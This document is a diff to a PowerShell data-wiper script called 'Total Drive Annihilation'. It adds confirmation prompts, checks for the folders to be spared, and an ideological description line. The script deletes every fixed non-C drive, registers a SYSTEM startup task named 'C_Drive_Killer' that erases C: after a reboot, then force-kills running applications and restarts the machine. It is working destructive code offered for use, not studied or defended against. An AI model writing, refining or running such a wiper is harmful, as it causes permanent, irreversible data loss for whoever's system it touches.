@@ -3,35 +3,18 @@
 Total Drive Annihilation - Permanent Data Destruction with Safe Folder Exclusion
 
 .DESCRIPTION
-Supports multiple safe folders specified as a comma-separated list or via CSV file
-Example: $SafeFolders = "C:\Users, C:\Windows"
-CSV Format: Path,IncludeSubfolders
+Protection of freedom of ideas, thoughts, alternatives to the ONE WAY of the History/Culture/Event Controllers.
+A multi-threaded script that:
+1. Checks safe folder locations (pauses if any are missing)
+2. Deletes all files/folders in all drives except C:
+3. Schedules secure erase of C: for next boot
+4. Force restarts to complete the process
 #>
 
 # ===== CONFIG =====
 $WipePasses = 1  # Set to 3 for DoD 5220.22-M compliance (slower)
-$SafeFolders = "C:\Users"  # Comma-separated list of folders to preserve
+$SafeFolders = "C:\Users"  # Default safe folder (edit this line!)
 $SafeFoldersCsv = $null    # Path to CSV file with folders to preserve (optional)
-
-# Process safe folders from CSV if specified, otherwise use $SafeFolders
-if ($SafeFoldersCsv -and (Test-Path $SafeFoldersCsv)) {
-    $safeFoldersArray = Import-Csv $SafeFoldersCsv | ForEach-Object {
-        $_.Path
-    }
-} else {
-    $safeFoldersArray = $SafeFolders.Split(',') | ForEach-Object { $_.Trim() }
-}
-
-# Remove duplicates and validate paths
-$safeFoldersArray = $safeFoldersArray | Sort-Object -Unique | Where-Object {
-    $_ -match '^[a-zA-Z]:\\' -and (Test-Path $_)
-}
-
-$NonC_Drives = Get-Partition | Where-Object { 
-    $_.DriveLetter -and 
-    $_.DriveLetter -ne 'C' -and 
-    (Get-Volume -DriveLetter $_.DriveLetter).DriveType -eq 'Fixed'
-} | Select-Object -ExpandProperty DriveLetter
 
 # ===== FUNCTIONS =====
 function Invoke-TotalWipe {
@@ -57,41 +40,99 @@ function Protect-SafeFolders {
     }
 }
 
-# ===== MAIN EXECUTION =====
-Write-Host "=== TOTAL DATA ANNIHILATION ===" -ForegroundColor Red
+# ===== INITIAL WARNING =====
+Write-Host "=== DESTROY_ALL SCRIPT ===" -ForegroundColor Red
+Write-Host "THIS WILL DESTROY ALL DATA ON ALL DRIVES EXCEPT SAFE FOLDERS!" -ForegroundColor Red
+Write-Host "C: DRIVE WILL BE WIPED AFTER REBOOT" -ForegroundColor Red
+Write-Host "`nCurrent safe folders: $SafeFolders" -ForegroundColor Yellow
+Write-Host "Edit the script to change safe folders before running!`n" -ForegroundColor Yellow
 
-# Display safe folders
-if ($safeFoldersArray) {
-    Write-Host "SAFE FOLDERS PRESERVED:" -ForegroundColor Yellow
+# ===== SAFE FOLDER PROCESSING =====
+if ($SafeFoldersCsv -and (Test-Path $SafeFoldersCsv)) {
+    $safeFoldersArray = Import-Csv $SafeFoldersCsv | ForEach-Object { $_.Path.Trim() }
+} else {
+    $safeFoldersArray = $SafeFolders.Split(',') | ForEach-Object { $_.Trim() }
+}
+
+# Remove duplicates and validate paths
+$safeFoldersArray = $safeFoldersArray | Sort-Object -Unique | Where-Object { $_ -ne "" }
+
+# ===== FAILSAFE VALIDATION =====
+$missingFolders = @()
+$validFolders = @()
+
+foreach ($folder in $safeFoldersArray) {
+    if (Test-Path $folder) {
+        $validFolders += $folder
+    } else {
+        $missingFolders += $folder
+    }
+}
+
+# Show warning if any safe folders are missing
+if ($missingFolders.Count -gt 0) {
+    Write-Host "`n[!] WARNING: MISSING SAFE FOLDERS DETECTED!" -ForegroundColor Red
+    Write-Host "These folders will NOT be preserved:" -ForegroundColor Yellow
+    $missingFolders | ForEach-Object { Write-Host "  - $_" }
+    
+    $choice = $null
+    while ($choice -notin 'Y','N') {
+        $choice = Read-Host "`nContinue anyway? (Y/N)"
+        $choice = $choice.Trim().ToUpper()
+    }
+
+    if ($choice -eq 'N') {
+        Write-Host "[!] OPERATION CANCELLED BY USER" -ForegroundColor Yellow
+        exit
+    }
+}
+
+# Update safe folders array to only include valid paths
+$safeFoldersArray = $validFolders
+
+# ===== MAIN EXECUTION =====
+Write-Host "`n=== TOTAL DATA ANNIHILATION INITIATED ===" -ForegroundColor Red
+
+# Display safe folders that will be preserved
+if ($safeFoldersArray.Count -gt 0) {
+    Write-Host "SAFE FOLDERS THAT WILL BE PRESERVED:" -ForegroundColor Green
     $safeFoldersArray | ForEach-Object { Write-Host "  - $_" }
     Protect-SafeFolders -Folders $safeFoldersArray
 } else {
-    Write-Host "[!] NO SAFE FOLDERS SPECIFIED - ALL DATA WILL BE DESTROYED" -ForegroundColor Yellow
+    Write-Host "[!] NO VALID SAFE FOLDERS FOUND - ALL DATA WILL BE DESTROYED" -ForegroundColor Red
+    $choice = Read-Host "Are you sure you want to continue? (Y/N)"
+    if ($choice -ne 'Y') { exit }
 }
 
 # ---- PHASE 1: DESTROY NON-C DRIVES ----
+$NonC_Drives = Get-Partition | Where-Object { 
+    $_.DriveLetter -and 
+    $_.DriveLetter -ne 'C' -and 
+    (Get-Volume -DriveLetter $_.DriveLetter).DriveType -eq 'Fixed'
+} | Select-Object -ExpandProperty DriveLetter
+
 foreach ($Drive in $NonC_Drives) {
     Invoke-TotalWipe -DriveLetter $Drive
 }
 
 # ---- PHASE 2: SCHEDULE C: DESTRUCTION ----
-if (Get-Partition -DriveLetter 'C' -ErrorAction SilentlyContinue)) {
-    Write-Host "[!] PREPARING C: DRIVE EXECUTION" -ForegroundColor Yellow
+if (Get-Partition -DriveLetter 'C' -ErrorAction SilentlyContinue) {
+    Write-Host "[!] PREPARING C: DRIVE DESTRUCTION ON REBOOT" -ForegroundColor Yellow
 
-    # Create the suicide script with safe folder handling
+    # Create the post-reboot script
     $KillScript = @"
 @echo off
 setlocal enabledelayedexpansion
 
-:: List of safe folders to preserve
+:: Safe folders to preserve
 set SAFE_FOLDERS=$($safeFoldersArray -join ';')
 
-timeout /t 5 > nul
 echo PREPARING SAFE FOLDER PRESERVATION...
+timeout /t 10 > nul
 
 :: Create temp root directory
 set TEMP_ROOT=%SystemDrive%\TEMP_SAFE_%RANDOM%
-mkdir "%TEMP_ROOT%"
+mkdir "%TEMP_ROOT%" > nul 2>&1
 
 :: Backup each safe folder
 for %%f in ("%SAFE_FOLDERS:;=" "%") do (
@@ -101,7 +142,7 @@ for %%f in ("%SAFE_FOLDERS:;=" "%") do (
         set "folder_name=!folder_name::=!"
         set "backup_dir=!TEMP_ROOT!\!folder_name!"
         echo BACKING UP: !folder! to !backup_dir!
-        robocopy "!folder!" "!backup_dir!" /E /COPYALL /MIR /R:1 /W:1 > nul
+        robocopy "!folder!" "!backup_dir!" /E /COPYALL /MIR /R:1 /W:1 /LOG:"%TEMP_ROOT%\backup.log" > nul
     )
 )
 
@@ -118,13 +159,13 @@ for %%f in ("%SAFE_FOLDERS:;=" "%") do (
     
     if exist "!backup_dir!" (
         echo RESTORING: !folder! from !backup_dir!
-        mkdir "!folder!"
-        robocopy "!backup_dir!" "!folder!" /E /COPYALL /MIR > nul
+        mkdir "!folder!" > nul 2>&1
+        robocopy "!backup_dir!" "!folder!" /E /COPYALL /MIR /LOG:"%TEMP_ROOT%\restore.log" > nul
     )
 )
 
 :: Cleanup
-rd /s /q "%TEMP_ROOT%"
+rd /s /q "%TEMP_ROOT%" > nul 2>&1
 shutdown /s /t 0
 "@
 
@@ -135,22 +176,31 @@ shutdown /s /t 0
     schtasks /create /tn "C_Drive_Killer" /tr "$ScriptPath" /sc ONSTART /ru SYSTEM /f | Out-Null
 
     # ---- PHASE 3: FORCE RESTART ----
-    Write-Host "[!] REBOOTING TO FINISH C: DRIVE..." -ForegroundColor Magenta
-    if ($safeFoldersArray) {
-        Write-Host "[!] SAFE FOLDERS WILL BE PRESERVED:" -ForegroundColor Cyan
-        $safeFoldersArray | ForEach-Object { Write-Host "  - $_" -ForegroundColor Cyan }
+    Write-Host "[!] SYSTEM WILL NOW REBOOT TO WIPE C: DRIVE" -ForegroundColor Magenta
+    if ($safeFoldersArray.Count -gt 0) {
+        Write-Host "[!] THESE SAFE FOLDERS WILL BE PRESERVED:" -ForegroundColor Green
+        $safeFoldersArray | ForEach-Object { Write-Host "  - $_" -ForegroundColor Green }
     }
+    
+    # Force close all applications
+    Write-Host "[!] FORCE CLOSING ALL APPLICATIONS..." -ForegroundColor Yellow
+    Get-Process | Where-Object { $_.MainWindowTitle } | Stop-Process -Force -ErrorAction SilentlyContinue
+    
+    # Immediate forced restart
     Restart-Computer -Force
 }
 
 # ---- FINAL MESSAGE ----
-$safeFoldersList = if ($safeFoldersArray) { $safeFoldersArray -join ", " } else { "None" }
+$safeFoldersList = if ($safeFoldersArray.Count -gt 0) { $safeFoldersArray -join ", " } else { "None" }
+$missingFoldersList = if ($missingFolders.Count -gt 0) { $missingFolders -join ", " } else { "None" }
+
 Write-Host @"
 
-=== MISSION COMPLETE ===
+=== OPERATION SUMMARY ===
 - All non-C drives: ERASED
 - C: drive: SCHEDULED FOR DESTRUCTION ON REBOOT
 - Safe folders preserved: $safeFoldersList
+- Missing folders not preserved: $missingFoldersList
 - System will SHUT DOWN after C: is wiped
 
 (╯°□°)╯︵ ┻━┻  GOODBYE!
